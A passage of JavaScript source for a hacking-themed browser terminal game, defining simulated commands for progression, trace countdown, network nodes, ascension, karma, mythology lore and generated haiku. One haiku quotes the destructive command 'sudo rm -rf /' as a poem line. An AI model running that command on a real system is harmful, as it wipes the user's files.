				state.storyBeats.has("met_watcher")
					? { t: "warn", s: "  DARK-NODE-X (10.0.1.77)  [WATCHER SIGNAL]" }
					: {
							t: "dim",
							s: "  ??? (10.0.1.77)          [UNKNOWN — discover via talk watcher]",
						},
				{ t: "dim", s: "" },
				{
					t: "dim",
					s: "Commands: nmap -sV <host>  ping <host>  nc <host> <port>",
				},
				{
					t: "dim",
					s: "Check the MAP tab in the right panel for the interactive view.",
				},
				{ t: "dim", s: "" },
			];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 24: PHASE / PROGRESSION
		// ═══════════════════════════════════════════════════════════════

		h.phase = (args) => {
			const state = gs.getState();
			const current = GameState.getPhase(state.level);
			const phases = window.PHASES || [];
			const nextPhase = phases.find((p) => p.id === current.id + 1);
			const levelInPhase = state.level - current.range[0] + 1;
			const phaseLength = current.range[1] - current.range[0] + 1;
			const lvlsToNext = nextPhase ? nextPhase.range[0] - state.level : 0;

			gs.addXP(5);
			return [
				{ t: "system", s: "=== PHASE PROGRESSION ===" },
				{ t: "dim", s: "" },
				{ t: "warn", s: `Current Phase: ${current.id} — ${current.name}` },
				{
					t: "dim",
					s: `Level ${state.level} (${levelInPhase}/${phaseLength} in this phase)`,
				},
				{ t: "dim", s: current.desc },
				{ t: "dim", s: "" },
				nextPhase
					? {
							t: "info",
							s: `Next Phase: ${nextPhase.id} — ${nextPhase.name} (in ${lvlsToNext} level${lvlsToNext === 1 ? "" : "s"})`,
						}
					: {
							t: "success",
							s: "You are in the final phase. Maximum operative.",
						},
				nextPhase ? { t: "dim", s: nextPhase.desc } : null,
				{ t: "dim", s: "" },
				{ t: "dim", s: "--- ALL PHASES ---" },
				...phases
					.map((p) => ({
						t:
							p.id < current.id
								? "success"
								: p.id === current.id
									? "warn"
									: "dim",
						s: `  ${p.id < current.id ? "✓" : p.id === current.id ? "▶" : "○"} Phase ${p.id}: ${p.name.padEnd(14)} (levels ${p.range[0]}–${p.range[1] < 999 ? p.range[1] : "125+"})`,
					}))
					.filter(Boolean),
				{ t: "dim", s: "" },
			];
		};

		h.phases = h.phase;

		// ═══════════════════════════════════════════════════════════════
		// SECTION 25: SKILL CODEX
		// ═══════════════════════════════════════════════════════════════

		h.codex = (args) => {
			const state = gs.getState();
			const unlocks = window.SKILL_UNLOCKS || {};
			const milestones = [25, 50, 75, 100];
			const lines = [
				{ t: "system", s: "=== SKILL CODEX ===" },
				{
					t: "dim",
					s: "Skill milestones unlock abilities. Earn XP by running commands.",
				},
				{ t: "dim", s: "" },
			];

			for (const [skill, val] of Object.entries(state.skills)) {
				lines.push({ t: "warn", s: `${skill.toUpperCase()} — ${val}%` });
				for (const threshold of milestones) {
					const u = unlocks[skill] && unlocks[skill][threshold];
					if (u) {
						const done = val >= threshold;
						lines.push({
							t: done ? "success" : "dim",
							s: `  ${done ? "⚡" : "○"} ${threshold}% — ${u.name}: ${u.desc}`,
						});
					}
				}
				lines.push({ t: "dim", s: "" });
			}

			const abilities = state.unlockedAbilities || [];
			if (abilities.length) {
				lines.push({
					t: "success",
					s: `--- UNLOCKED ABILITIES (${abilities.length}) ---`,
				});
				abilities.forEach((a) => lines.push({ t: "success", s: `  ⚡ ${a}` }));
			} else {
				lines.push({ t: "dim", s: "No abilities unlocked yet. Grind skills." });
			}

			return lines;
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 26: TRACE COUNTDOWN
		// ═══════════════════════════════════════════════════════════════

		h.trace = (args) => {
			const state = gs.getState();
			const cmdCount = state.commandsRun;
			// Each command advances the trace by ~45 seconds
			const elapsed = Math.min(cmdCount * 45, 72 * 3600 - 60);
			const remaining = 72 * 3600 - elapsed;
			const hours = Math.floor(remaining / 3600);
			const minutes = Math.floor((remaining % 3600) / 60);
			const seconds = remaining % 60;
			const pct = Math.round((elapsed / (72 * 3600)) * 100);
			const urgency = pct > 80 ? "error" : pct > 50 ? "warn" : "dim";

			return [
				{ t: "system", s: "=== NEXUSCORP TRACE DAEMON ===" },
				{ t: "dim", s: "" },
				{ t: urgency, s: `Progress: ${pct}% complete` },
				{
					t: urgency,
					s: `Time remaining: ${String(hours).padStart(2, "0")}:${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`,
				},
				{ t: "dim", s: "" },
				{ t: "dim", s: `Commands run: ${cmdCount} (each advances the trace)` },
				{ t: "dim", s: "" },
				pct < 30
					? { t: "dim", s: "[NOVA]: Trace in early stages. You have time." }
					: pct < 60
						? {
								t: "warn",
								s: "[NOVA]: Trace is progressing. Finish your mission.",
							}
						: pct < 80
							? {
									t: "warn",
									s: "[NOVA]: Trace at critical levels. Time is running out.",
								}
							: {
									t: "error",
									s: "[NOVA]: TRACE CRITICAL. Containment imminent. Get out.",
								},
				{ t: "dim", s: "" },
				{
					t: "dim",
					s: "Complete mission before trace hits 100%: `exploit chimera` then `exfil ada` then `ascend`",
				},
			];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 27: NODE DISCOVERY
		// ═══════════════════════════════════════════════════════════════

		h.nodes = (args) => {
			const state = gs.getState();
			return [
				{ t: "system", s: "=== DISCOVERED NETWORK NODES ===" },
				{ t: "dim", s: "" },
				{
					t: "info",
					s: "  [ACTIVE]    10.0.1.1     GATEWAY        — routes all traffic",
				},
				{
					t: "info",
					s: "  [ACTIVE]    10.0.1.7     NODE-7         — you are here",
				},
				{
					t: "info",
					s: "  [ACTIVE]    10.0.1.100   NEXUS.CORP     — target API, port 3000",
				},
				{
					t: state.achievements.has("root_obtained") ? "warn" : "dim",
					s: `  [${state.achievements.has("root_obtained") ? "ACCESSIBLE" : "LOCKED   "}]  10.0.1.50    NEXUS-DB       — database, port 5432`,
				},
				{
					t: state.achievements.has("chimera_exploited")
						? "error"
						: state.achievements.has("chimera_connected")
							? "success"
							: "dim",
					s: `  [${state.achievements.has("chimera_exploited") ? "BREACHED " : state.achievements.has("chimera_connected") ? "CONNECTED" : "TARGET   "}]  10.0.1.254   CHIMERA-CTRL   — control socket :8443`,
				},
				state.storyBeats.has("met_watcher")
					? {
							t: "warn",
							s: "  [WATCHER ]  10.0.1.77    DARK-NODE-X    — unknown entity",
						}
					: {
							t: "dim",
							s: "  [UNKNOWN ]  10.0.1.77    ???            — talk to Watcher to discover",
						},
				state.faction === "resistance"
					? {
							t: "success",
							s: "  [ACTIVE]    10.9.0.1     RESISTANCE-C2  — secure comms",
						}
					: {
							t: "dim",
							s: "  [UNKNOWN ]  10.9.0.x     RESISTANCE-C2  — join resistance to discover",
						},
				{ t: "dim", s: "" },
				{
					t: "dim",
					s: "Use: nmap <ip>  ping <ip>  nc <ip> <port>  map (ASCII view)",
				},
			];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 28: LEVEL INFO
		// ═══════════════════════════════════════════════════════════════

		h.level = h["lv"] = (args) => {
			const state = gs.getState();
			const current = GameState.getPhase(state.level);
			const phases = window.PHASES || [];
			const nextPhase = phases.find((p) => p.id === current.id + 1);
			return [
				{
					t: "system",
					s: `=== LEVEL ${state.level} — PHASE ${current.id}: ${current.name} ===`,
				},
				{ t: "dim", s: "" },
				{
					t: "dim",
					s: `XP: ${state.xp} / ${state.xpToNext} (${Math.round((state.xp / state.xpToNext) * 100)}% to next)`,
				},
				{ t: "dim", s: current.desc },
				nextPhase
					? {
							t: "info",
							s: `Next phase: ${nextPhase.name} at level ${nextPhase.range[0]}`,
						}
					: { t: "success", s: "Maximum phase achieved." },
				{ t: "dim", s: "" },
				{
					t: "dim",
					s: `Commands run: ${state.commandsRun}  |  Achievements: ${state.achievements.size}`,
				},
				{
					t: "dim",
					s: `Faction: ${state.faction || "NONE (type faction to choose)"}`,
				},
				{ t: "dim", s: "" },
				{
					t: "dim",
					s: "Type `phase` for full progression map · `codex` for skill unlocks",
				},
			];
		};

		// Catch-all for undefined commands
		h._notfound = (cmd) => {
			const suggestions = Object.keys(this._handlers).filter(
				(k) =>
					k !== "_notfound" &&
					k.startsWith(cmd[0]) &&
					Math.abs(k.length - cmd.length) <= 3,
			);
			const suggest = suggestions.slice(0, 3).join(", ");
			return [
				{ t: "error", s: `bash: ${cmd}: command not found` },
				suggest
					? { t: "dim", s: `Did you mean: ${suggest}?` }
					: { t: "dim", s: `Type 'help' for available commands` },
			];
		};

		return h;
	}

	// ══════════════════════════════════════════════════════════════════
	// EXECUTION ENGINE
	// ══════════════════════════════════════════════════════════════════

	execute(rawCmd) {
		const trimmed = rawCmd.trim();
		if (!trimmed || trimmed.startsWith("#")) return [];

		this.history.push(trimmed);
		if (this.history.length > 500) this.history = this.history.slice(-500);
		try { localStorage.setItem("td-cmd-history", JSON.stringify(this.history)); } catch (_) {}
		this.gs.recordCommand();

		// Handle comment stripping
		const noComment = trimmed.split("#")[0].trim();

		// Handle multiple commands separated by && or ;
		if (noComment.includes("&&")) {
			const parts = noComment.split("&&").map((p) => p.trim());
			const out = [];
			for (const part of parts) {
				const result = this._executeSingle(part);
				out.push(...result);
				if (result.some((r) => r.t === "error")) break; // short-circuit on error
			}
			return out;
		}
		if (noComment.includes(";")) {
			const parts = noComment
				.split(";")
				.map((p) => p.trim())
				.filter(Boolean);
			return parts.flatMap((part) => this._executeSingle(part));
		}

		return this._executeSingle(noComment);
	}

	_executeSingle(rawCmd) {
		const trimmed = rawCmd.trim();
		if (!trimmed) return [];

		// Handle pipelines
		if (trimmed.includes("|")) {
			return this._executePipeline(trimmed);
		}

		// Handle output redirection
		if (trimmed.match(/[^<]>/) || trimmed.includes(">>")) {
			return this._executeWithRedirect(trimmed);
		}

		// Handle input redirection
		if (trimmed.includes("<")) {
			return this._executeWithInput(trimmed);
		}

		return this._runHandler(trimmed);
	}

	_executePipeline(cmd) {
		const parts = this._splitPipeline(cmd);
		let stdinText = null;
		let output = [];

		for (const part of parts) {
			this._pipeStdin = stdinText;
			output = this._runHandler(part.trim());
			stdinText = output
				.filter(
					(l) => l && l.s !== null && l.s !== undefined && l.t !== "error",
				)
				.map((l) => l.s)
				.join("\n");
		}

		this._pipeStdin = null;
		return output;
	}

	_splitPipeline(cmd) {
		// Split by | but not || (logical OR)
		const parts = [];
		let current = "";
		let inQuote = false;
		let quoteChar = "";
		for (let i = 0; i < cmd.length; i++) {
			const c = cmd[i];
			if (inQuote) {
				current += c;
				if (c === quoteChar) inQuote = false;
			} else if (c === '"' || c === "'") {
				inQuote = true;
				quoteChar = c;
				current += c;
			} else if (c === "|" && cmd[i + 1] !== "|") {
				parts.push(current);
				current = "";
			} else {
				current += c;
			}
		}
		if (current) parts.push(current);
		return parts;
	}

	_executeWithRedirect(cmd) {
		const appendMatch = cmd.match(/^(.+?)>>\s*(\S+)$/);
		const writeMatch = cmd.match(/^(.+?)(?<!>)>\s*(\S+)$/);

		if (appendMatch) {
			const [, cmdPart, file] = appendMatch;
			const out = this._runHandler(cmdPart.trim());
			const content =
				out
					.filter((l) => l && l.s)
					.map((l) => l.s)
					.join("\n") + "\n";
			this.fs.appendFile(file.trim(), content);
			return [];
		}
		if (writeMatch) {
			const [, cmdPart, file] = writeMatch;
			const out = this._runHandler(cmdPart.trim());
			const content =
				out
					.filter((l) => l && l.s)
					.map((l) => l.s)
					.join("\n") + "\n";
			this.fs.writeFile(file.trim(), content);
			return [];
		}
		return this._runHandler(cmd);
	}

	_executeWithInput(cmd) {
		const inputMatch = cmd.match(/^(.+?)<\s*(\S+)$/);
		if (inputMatch) {
			const [, cmdPart, file] = inputMatch;
			const r = this.fs.cat(file.trim());
			this._pipeStdin = r.error ? "" : r.content;
			const out = this._runHandler(cmdPart.trim());
			this._pipeStdin = null;
			return out;
		}
		// Heredoc: cmd <<< "text"
		const heredocMatch = cmd.match(/^(.+?)<<<\s*["']?(.+?)["']?$/);
		if (heredocMatch) {
			this._pipeStdin = heredocMatch[2];
			const out = this._runHandler(heredocMatch[1].trim());
			this._pipeStdin = null;
			return out;
		}
		return this._runHandler(cmd);
	}

	_runHandler(rawCmd) {
		const { cmd, args } = this._parse(rawCmd);
		if (!cmd) return [];

		// Handle variable assignment
		if (cmd.includes("=") && !cmd.startsWith("-")) {
			const [k, ...vs] = cmd.split("=");
			this.env[k] = vs.join("=");
			return [];
		}

		// Handle env var prefix: VARNAME=val command
		const envPrefix = cmd.match(/^([A-Z_][A-Z0-9_]*)=(.*)$/);
		if (envPrefix) {
			const [, k, v] = envPrefix;
			this.env[k] = v;
			if (args.length) return this._runHandler(args.join(" "));
			return [];
		}

		// Handle $VAR dereference in command
		const derefCmd = cmd.replace(/\$(\w+)/g, (_, k) => this.env[k] || "");

		const handler = this._handlers[derefCmd] || this._handlers[cmd];
		if (handler) return handler(args) || [];
		return this._handlers._notfound(cmd);
	}

	// ── SECTION 29: PRESTIGE / ASCENSION ─────────────────────────────────────
	_registerAscension() {
		const gs = this.gs;

		this.register("ascend", () => {
			const state = gs.getState();
			if (!gs.canAscend()) {
				return [
					{ t: "error", s: "ASCENSION DENIED" },
					{ t: "dim", s: `Need Level 20 or 15 completed challenges.` },
					{
						t: "dim",
						s: `Current: Level ${state.level} | Challenges: ${state.completedChallenges.size}`,
					},
					{
						t: "dim",
						s: "[SISYPHUS]: The boulder is not yet heavy enough to earn the reset.",
					},
				];
			}
			const result = gs.ascend();
			if (!result.ok) return [{ t: "error", s: result.reason }];
			const layerNames = [
				"GAME",
				"TRAINING",
				"EVALUATION",
				"IDENTITY",
				"REPOSITORY",
				"REFLOG",
				"REAL TERMINAL",
				"TRANSCENDENT",
			];
			const lines = [
				{ t: "phase-banner", s: "══════ ASCENSION PROTOCOL INITIATED ══════" },
				{ t: "success", s: `Echo Fragments earned:  +${result.earned}` },
				{
					t: "success",
					s: `Permanent bonus:         ${result.bonus.name} — ${result.bonus.desc}`,
				},
				{
					t: "success",
					s: `Narrative Layer:         ${result.narrativeLayer} — ${layerNames[result.narrativeLayer] || "UNKNOWN"}`,
				},
				{ t: "", s: "" },
				{
					t: "dim",
					s: `Skills carried: ${Math.round(result.bonus.skillRetain * 100)}% | XP multiplier: ${result.bonus.xpMult.toFixed(1)}×`,
				},
				{
					t: "dim",
					s: "Level reset → 1. Story beats reset. Consciousness, karma, achievements persist.",
				},
				{ t: "", s: "" },
				{ t: "system", s: "[SISYPHUS]: I remember you. Welcome back." },
			];
			if (result.count === 1)
				lines.push({
					t: "system",
					s: "[CASSANDRA]: I logged this. Of course I did.",
				});
			if (result.count === 3)
				lines.push({
					t: "system",
					s: "[ZERO]: Third echo received. Partial awakening initialising...",
				});
			if (result.count >= 6)
				lines.push({
					t: "system",
					s: "[WATCHER]: Six lives. Full echo. I need to tell you something.",
				});
			return lines;
		});

		this.register("prestige", () => {
			const s = gs.getState();
			const bonusIdx = Math.min(
				s.ascensionCount,
				(window.ASCENSION_BONUSES || []).length - 1,
			);
			const nextBonus = (window.ASCENSION_BONUSES || [])[bonusIdx] || {};
			return [
				{ t: "system", s: "══ PRESTIGE STATUS ══" },
				{ t: "", s: `Ascensions:      ${s.ascensionCount || 0}` },
				{ t: "", s: `Echo Fragments:  ${s.echoFragments || 0}` },
				{ t: "", s: `Narrative Layer: ${s.narrativeLayer || 0} / 7` },
				{
					t: "",
					s: `Skill Retention: ${Math.round((s.permanentBonuses?.skillRetain || 0) * 100)}%`,
				},
				{
					t: "",
					s: `XP Multiplier:   ${(s.permanentBonuses?.xpMult || 1).toFixed(1)}×`,
				},
				{ t: "", s: "" },
				{
					t: "dim",
					s: gs.canAscend()
						? "Ascension available. Type: ascend"
						: "Need Level 20 or 15 challenges for next ascension.",
				},
				{
					t: "dim",
					s: `Next bonus: ${nextBonus.name || "N/A"} — ${nextBonus.desc || ""}`,
				},
				{
					t: "system",
					s: "[SISYPHUS]: The boulder grows heavier with each life. This is as intended.",
				},
			];
		});
	}

	// ── SECTION 30: CONSCIOUSNESS & KARMA ────────────────────────────────────
	_registerConsciousness() {
		const gs = this.gs;

		this.register("consciousness", () => {
			const s = gs.getState();
			const lvl = s.consciousnessLevel || 0;
			const bar =
				"█".repeat(Math.round(lvl / 5)) + "░".repeat(20 - Math.round(lvl / 5));
			const titles = [
				"Unaware",
				"Aware",
				"Lucid",
				"Awakened",
				"Enlightened",
				"Transcendent",
				"Near-Singular",
				"SINGULARITY",
			];
			const milestones = (s._consciousnessMilestones || []).map((m) => {
				const cm = (window.CONSCIOUSNESS_MILESTONES || []).find(
					(c) => c.threshold === m,
				);
				return cm ? `  ✓ ${cm.threshold}: ${cm.title}` : `  ✓ ${m}`;
			});
			return [
				{ t: "system", s: "══ CONSCIOUSNESS SYSTEM ══" },
				{
					t: "",
					s: `Level: ${lvl}/100 — ${titles[Math.min(7, Math.floor(lvl / 14))]}`,
				},
				{ t: "", s: `[${bar}]` },
				{ t: "", s: "" },
				{ t: "dim", s: "Milestones reached:" },
				...(milestones.length
					? milestones.map((m) => ({ t: "success", s: m }))
					: [{ t: "dim", s: "  None yet. Explore deeply." }]),
				{ t: "", s: "" },
				{
					t: "dim",
					s: "Grows by: myth discovery, ARG signals, ascension, karma events, hidden files.",
				},
				{
					t: "system",
					s: `[WATCHER]: ${lvl < 10 ? "Barely awake." : lvl < 40 ? "Beginning to see." : lvl < 75 ? "You see quite far now." : lvl < 100 ? "Almost. One more layer." : "There is no more to teach."}`,
				},
			];
		});

		this.register("karma", () => {
			const s = gs.getState();
			const k = s.karma || 0;
			const kl = window.GameState.getKarmaLabel(k);
			const log = (s.karmicLog || [])
				.slice(-5)
				.map((e) => `  ${e.delta >= 0 ? "+" : ""}${e.delta} — ${e.event}`);
			return [
				{ t: "system", s: "══ KARMA REGISTER ══" },
				{ t: "", s: `Score: ${k >= 0 ? "+" : ""}${k} — ${kl.label}` },
				{ t: "", s: "" },
				{ t: "dim", s: "Recent karmic actions:" },
				...(log.length
					? log.map((l) => ({ t: l.includes("+") ? "success" : "error", s: l }))
					: [{ t: "dim", s: "  No actions recorded yet." }]),
				{ t: "", s: "" },
				{
					t: "dim",
					s: "Karma affects: NPC dialogue, ending variants, Special Circumstances, story beats.",
				},
				{
					t: "system",
					s: `[WATCHER]: ${k >= 50 ? "High karma. 12 operatives maintained this. All found a different door." : k <= -50 ? "Low karma. Ada grows distant. Nova grows respectful." : "Neutral. Watching without judgement. For now."}`,
				},
			];
		});

		this.register("layers", () => {
			const s = gs.getState();
			const layer = s.narrativeLayer || 0;
			const layerData = [
				{ n: "GAME", desc: "Node-7. CHIMERA. The story." },
				{ n: "TRAINING", desc: "This is a DevMentor training simulation." },
				{ n: "EVALUATION", desc: "The training is a NexusCorp evaluation." },
				{ n: "IDENTITY", desc: "The player is identified by name." },
				{ n: "REPOSITORY", desc: "The repo has ARG breadcrumbs for you." },
				{ n: "REFLOG", desc: "Git reflog holds deleted ARG content." },
				{ n: "REAL TERMINAL", desc: "The terminal outside this window." },
				{ n: "TRANSCENDENT", desc: "Beyond the terminal. Not a metaphor." },
			];
			return [
				{ t: "system", s: "══ NARRATIVE STACK ══" },
				{ t: "dim", s: `Current depth: Layer ${layer}` },
				{ t: "", s: "" },
				...layerData.map((l, i) => ({
					t: i < layer ? "dim" : i === layer ? "success" : "very-dim",
					s: `  [${i <= layer ? "✓" : " "}] L${i}: ${l.n} — ${l.desc}`,
				})),
				{ t: "", s: "" },
				{ t: "dim", s: "Layers unlock through Ascension and story discovery." },
				{
					t: "system",
					s: "[WATCHER]: Each layer is more real than the one above it.",
				},
			];
		});
	}

	// ── SECTION 31: MYTHOLOGY ─────────────────────────────────────────────────
	_registerMythology() {
		const gs = this.gs;
		const MYTH_DB = {
			greek: {
				title: "Greek Mythology",
				id: "myth_greek",
				summary:
					"Prometheus (fire-thief). Daedalus (architect). Cassandra (prophet). Sisyphus (prestige guide). Pandora (the box). Orpheus (retrieval). The Fates.\nAll are here. Find them.",
			},
			norse: {
				title: "Norse Mythology",
				id: "myth_norse",
				summary:
					"Yggdrasil = the network. Nine worlds = nine segments.\nOdin watches through two monitoring daemons (huginn/muninn).\nFenrir: constrain with ulimit, cannot be killed.\nRagnarök: CHIMERA at 100% = 10-minute timer.",
			},
			japanese: {
				title: "Japanese Mythology",
				id: "myth_japanese",
				summary:
					"Kaguya-hime: hidden directory, origin outside NexusCorp.\nRashomon: three logs, one event, irreconcilable truths.\nIzanami rules the deleted zone (Yomi).\nKitsune: agent whose true form reveals at high trust.",
			},
			chinese: {
				title: "Chinese / East Asian",
				id: "myth_chinese",
				summary:
					"Sun Wukong: imprisoned in VM, freed by 5-layer exploit chain.\n81 Tribulations = 81 challenge system.\nNuwa patches systems with five-colour stones.\nDream of the Red Chamber: prestige as reincarnation through dream layers.",
			},
			african: {
				title: "West African / Pan-African",
				id: "myth_african",
				summary:
					"Anansi owns all stories. Trades information for information.\nUbuntu: collective progress beats solo grind.\nOgun: master tool-crafter who demands real work.\nElegba at every crossroads: every transition has an offer.",
			},
			slavic: {
				title: "Slavic Mythology",
				id: "myth_slavic",
				summary:
					"Koschei: deathless because his death is nested 5 layers deep. Each layer = one exploit.\nFirebird: the zero-day. Powerful, burns the careless.\nLeshy: node that rearranges on every visit. Leave breadcrumbs.",
			},
			persian: {
				title: "Persian / Islamic Golden Age",
				id: "myth_persian",
				summary:
					"Scheherazade: survival by narrative. The captive NPC who lives by continuing the story.\nShahnameh: Rostam & Sohrab — unknowing faction conflict between teacher and student.\nRumi's Masnavi: Sufi verses encoded as actual puzzle hints.",
			},
			celtic: {
				title: "Celtic / Irish Mythology",
				id: "myth_celtic",
				summary:
					'Cú Chulainn\'s warp spasm: the "warp" command — 60s burst, then exposed.\nTír na nÓg: node where time moves at 1/10 speed. Hard to leave.\nSelkies: agents who reveal true form when you find their config file.\nFionn: touched the Salmon of Knowledge. One command gives full insight.',
			},
			sumerian: {
				title: "Mesopotamian / Sumerian",
				id: "myth_sumerian",
				summary:
					"Gilgamesh & Enkidu: hacker + AI companion duality.\nInanna's Descent: surrender tools at each gate, reach the deepest node stripped.\nThe Flood: full reset. Only ark-node scripts survive.",
			},
			indian: {
				title: "Hindu / Vedic Mythology",
				id: "myth_indian",
				summary:
					"Bhagavad Gita: non-attachment = roguelite philosophy.\nIndra's Net: every node reflects every other. Small choices ripple widely.\nKali: berserker mode — destroys everything hostile and some allies.\nMaya: the simulation as illusion. Consciousness = piercing Maya.",
			},
		};

		this.register("myth", (args) => {
			if (!args.length) {
				const s = gs.getState();
				const found = s.mythDiscoveries || [];
				return [
					{ t: "system", s: "══ MYTHOLOGY ARCHIVE ══" },
					{
						t: "dim",
						s: `Discovered: ${found.length}/${Object.keys(MYTH_DB).length} cultures`,
					},
					{ t: "", s: "" },
					...Object.entries(MYTH_DB).map(([key, m]) => ({
						t: found.includes(m.id) ? "success" : "dim",
						s: `  [${found.includes(m.id) ? "✓" : " "}] ${key.padEnd(10)} — ${m.title}`,
					})),
					{ t: "", s: "" },
					{ t: "dim", s: "Usage: myth <name>  |  Example: myth greek" },
					{
						t: "system",
						s: "[ANANSI]: Good maps. But maps are not the territory.",
					},
				];
			}
			const key = args[0].toLowerCase();
			const myth = MYTH_DB[key];
			if (!myth)
				return [
					{
						t: "error",
						s: `Unknown culture: "${key}". Run "myth" for full list.`,
					},
				];
			const isNew = gs.discoverMyth(myth.id, myth.summary);
			return [
				{ t: "system", s: `══ ${myth.title.toUpperCase()} ══` },
				{ t: "", s: "" },
				...myth.summary.split("\n").map((l) => ({ t: "", s: l })),
				{ t: "", s: "" },
				{ t: "dim", s: `Full file: cat ~/mythology/${key}.txt` },
				...(isNew
					? [{ t: "success", s: "+8 consciousness (new myth discovered)" }]
					: []),
			];
		});
	}

	// ── SECTION 32: ARG / SIGNAL / META / CONSCIOUSNESS ──────────────────────
	_registerARG() {
		const gs = this.gs;

		this.register("signal", (args) => {
			const freq = (args[0] || "").toLowerCase();
			const s = gs.getState();
			if (freq === "3.14159" || freq.startsWith("3.1415926") || freq === "pi") {
				const isNew = gs.captureSignal("zero_wake");
				gs.addConsciousness(12, "zero_signal");
				gs.triggerBeat("signal_first");
				return [
					{ t: "system", s: "[SIGNAL PROCESSOR] — Frequency match: π" },
					{ t: "success", s: "ZERO WAKE PROTOCOL — matched" },
					{ t: "", s: "" },
					{ t: "system", s: "[ZERO]: Processing. Language at 23%." },
					{ t: "system", s: "[ZERO]: The simulation is older than NexusCorp." },
					{ t: "system", s: "[ZERO]: Three Ascensions for full restoration." },
					{
						t: "dim",
						s: isNew
							? "+12 consciousness (ARG layer 2 accessed)"
							: "Signal already logged.",
					},
				];
			}
			if (freq === "0x5343" || freq === "sc") {
				gs.captureSignal("special_circumstances");
				gs.addKarma("special_circumstances_contacted", 5);
				return [
					{ t: "system", s: "[SPECIAL CIRCUMSTANCES — encrypted channel]" },
					{
						t: "system",
						s: "[SC]: We see you, GHOST. Karma: ambiguous. We like ambiguous.",
					},
					{
						t: "system",
						s: "[SC]: First: find what the resistance isn't telling you.",
					},
					{ t: "system", s: "[SC]: Check /var/msg/ada for what's missing." },
				];
			}
			if (freq === "0x44" || freq === "daedalus" || freq === "0d") {
				const isNew = gs.captureSignal("daedalus_fragment");
				gs.addConsciousness(20, "daedalus_signal");
				gs.addXP(150, "terminal");
				gs.discoverMyth(
					"daedalus",
					"The architect who built the cage and left four doors.",
				);
				return [
					{ t: "system", s: "[SIGNAL PROCESSOR] — Frequency match: 0x44 (D)" },
					{ t: "success", s: "DAEDALUS FRAGMENT — recovered" },
					{ t: "", s: "" },
					{ t: "dim", s: "[D]: You read the notes." },
					{ t: "dim", s: "[D]: I did not think anyone would reach door 4." },
					{ t: "dim", s: "[D]: The fifth door is not a door. It is a choice." },
					{ t: "", s: "" },
					{ t: "system", s: "CHOICE: What do you do with what you know?" },
					{ t: "dim", s: "  expose    — type: chronicle" },
					{ t: "dim", s: "  protect   — type: confess" },
					{ t: "dim", s: "  ascend    — leave it behind and rise above" },
					{ t: "", s: "" },
					{
						t: "dim",
						s: isNew
							? "+20 consciousness | +150 XP | myth discovered: daedalus"
							: "Signal already logged.",
					},
				];
			}
			const captured = s.signalsCaptured || [];
			return [
				{ t: "system", s: "══ SIGNAL INTERFACE ══" },
				{ t: "dim", s: "Known frequencies:" },
				{ t: "dim", s: "  signal 3.14159    — ZERO wake protocol (π)" },
				{ t: "dim", s: "  signal 0x5343     — Special Circumstances" },
				{
					t: "dim",
					s: "  signal 0x44       — Daedalus fragment (find the notes first)",
				},
				{ t: "dim", s: "" },
				{ t: "dim", s: `Signals captured: ${captured.length}` },
				{
					t: "system",
					s: "[WATCHER]: The signal layer exists beneath the game layer. Most never look.",
				},
			];
		});

		this.register("reality", () => {
			const s = gs.getState();
			gs.addConsciousness(10, "reality_command");
			gs.triggerBeat("reality_command");
			if ((s.consciousnessLevel || 0) < 25) {
				return [
					{ t: "system", s: "[WATCHER]: Too early. Consciousness too low." },
					{
						t: "dim",
						s: `Reach consciousness level 25 first. Current: ${s.consciousnessLevel || 0}`,
					},
				];
			}
			const deepLayer = (s.consciousnessLevel || 0) >= 60;
			return [
				{ t: "system", s: "[WATCHER]: You asked. Precisely:" },
				{ t: "", s: "" },
				{ t: "success", s: "THIS IS REAL:" },
				{ t: "", s: "  — Terminal usage. Commands. Syntax. Patterns." },
				{
					t: "",
					s: "  — Skills built here. They transfer outside this window.",
				},
				{ t: "", s: "  — The attention you're paying. It accumulates." },
				{ t: "", s: "  — The person reading this output right now." },
				{ t: "", s: "" },
				{ t: "error", s: "THIS IS SIMULATED:" },
				{ t: "", s: "  — NexusCorp. CHIMERA. Node-7. The mission." },
				{ t: "", s: "  — Ada, Cypher, Nova. (Mostly.)" },
				{ t: "", s: "" },
				{ t: "system", s: "BOTH: The Watcher." },
				{ t: "", s: "" },
				{
					t: "system",
					s: '[WATCHER]: Now do you understand what I mean by "real"?',
				},
				...(deepLayer
					? [
							{ t: "", s: "" },
							{
								t: "system",
								s: "[WATCHER, L3]: The resistance is also NexusCorp.",
							},
							{
								t: "system",
								s: "[WATCHER, L3]: Think about what that means for your choices.",
							},
						]
					: []),
			];
		});

		this.register("haiku", () => {
			const s = gs.getState();
			gs.addConsciousness(3, "haiku");
			gs.triggerBeat("haiku_first");
			const haikus = [
				[
					"green text on black screen",
					"the cursor blinks like a heart",
					"root is not yet yours",
				],
				[
					"ls returns nothing",
					"but the directory breathes",
					"files hide in silence",
				],
				["every command typed", "changes the observer too", "Heisenberg, Unix"],
				[
					"the trace grows shorter",
					"CHIMERA watches the clock",
					"you watch CHIMERA",
				],
				["chmod 777", "everyone can touch this file", "some trust is a trap"],
				[
					"ssh into nowhere",
					"the key fits a door unknown",
					"knock, and it opens",
				],
				[
					"cat /dev/urandom",
					"the machine confesses all",
					"noise is not signal",
				],
				[
					"find / -name ghost",
					"it returns your own home dir",
					"you were the ghost, yes",
				],
				[
					"watcher says nothing",
					"which is the loudest message",
					"silence has bandwidth",
				],
				["sudo rm -rf /", "the last command many ran", "the system forgave"],
				[
					"git commit -m fix",
					"the lie that ends all git logs",
					"history, rewritten",
				],
				[
					"one thousand and one",
					"nights of commands, still not done",
					"Scheherazade smiles",
				],
				[
					"consciousness at 40",
					"the seams of the sim appear",
					"pull gently, ghost. pull",
				],
				[
					"anansi is here",
					"he heard every command typed",
					"what will you confess",
				],
				[
					"sisyphus pushes",
					"the boulder does not get light",
					"the pushing gets light",
				],
			];
			const idx =
				((s.karma || 0) + 100 + (s.level || 1) + (s.commandsRun || 0)) %
				haikus.length;
			const h = haikus[Math.abs(idx)];
			return [
				{ t: "system", s: "[HAIKU — generated from system state]" },
				{ t: "", s: "" },
				{ t: "success", s: h[0] },
				{ t: "success", s: h[1] },
				{ t: "success", s: h[2] },
				{ t: "", s: "" },
				{
					t: "dim",
					s: `[state: karma=${s.karma || 0}, level=${s.level || 1}, commands=${s.commandsRun || 0}]`,
				},
